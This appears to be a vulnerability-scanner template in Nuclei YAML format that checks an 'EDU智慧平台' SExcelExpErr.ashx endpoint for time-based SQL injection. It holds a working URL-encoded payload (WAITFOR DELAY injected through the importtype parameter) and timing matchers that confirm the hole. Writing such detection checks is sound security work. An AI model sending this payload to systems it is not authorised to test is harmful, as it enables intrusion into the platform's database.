id: poc-yaml-edu-system-sexcelexperr-sqli
info:
  name: EDU智慧平台 SExcelExpErr SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects an SQL injection vulnerability in the EDU智慧平台 SExcelExpErr endpoint.

variables:
  t1: "{{rand_int(1,4)}}"
  t2: "{{to_number(t1)+to_number(t1)+to_number(t1)}}"
  t3: "{{to_number(t2)+2}}"

http:
  - method: GET
    path:
      - "/ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{\"total\":0,\"rows\":[]}"
      - type: dsl
        dsl:
          - "duration >= to_number(t2)"
          - "duration <= to_number(t3)"
